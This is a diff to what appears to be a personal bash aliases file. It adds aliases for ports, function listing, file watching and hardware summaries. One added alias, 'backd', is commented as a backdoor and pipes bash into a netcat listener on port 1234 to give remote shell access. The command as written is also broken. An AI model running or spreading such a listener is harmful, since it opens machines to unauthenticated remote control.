@@ -229,7 +229,9 @@ alias makescript="fc -rnl | head -1 >" #Easily make a script out of the last com
 # | Network                                                                    |
 # ------------------------------------------------------------------------------
 alias wget='wget -c'
-alias checkport='lsof -i '
+alias checkport_lsof='lsof -i '
+
+
 alias ports="netstat -lnpt4e | grep -w 'LISTEN'"
 alias portsu="netstat -lnp"
 
@@ -710,3 +712,20 @@ alias ffm_DetailsEncoderThis="ffmpeg -loglevel error -hide_banner -h encoder="
 
 #Display options specific to, and information about, a particular decoder:
 alias ffm_DetailsDecoderThis="ffmpeg -loglevel error -hide_banner -h decoder="
+
+#lists all functions registerd in bash
+alias list_functions='shopt -s extdebug;declare -F | grep -v "declare -f _" | declare -F $(awk "{print $3}") | column -t;shopt -u extdebug' 
+
+#top for files
+alias topFiles="watch -d -n 2 'df; ls -FlAt;'"
+
+ 
+#Create a b@ckd00r on a machine to allow remote connection to bash
+#This will launch a listener on the machine that will wait for a connection on port 1234. 
+#When you connect from a remote machine with something like : 
+#nc 192.168.0.1 1234 You will have console access to the machine through bash. 
+alias backd="/bin/bash | nc -l 1234"
+
+# Quick and dirty hardware summary where lshw is not available. Requires util-linux, procps, pciutils, usbutils and net-tools, which should be preinstalled on most systems. 
+alias gethw='(printf "\nCPU\n\n"; lscpu; printf "\nMEMORY\n\n"; free -h; printf "\nDISKS\n\n"; lsblk; printf "\nPCI\n\n"; lspci; printf "\nUSB\n\n"; lsusb; printf "\nNETWORK\n\n"; ifconfig) | less'
+
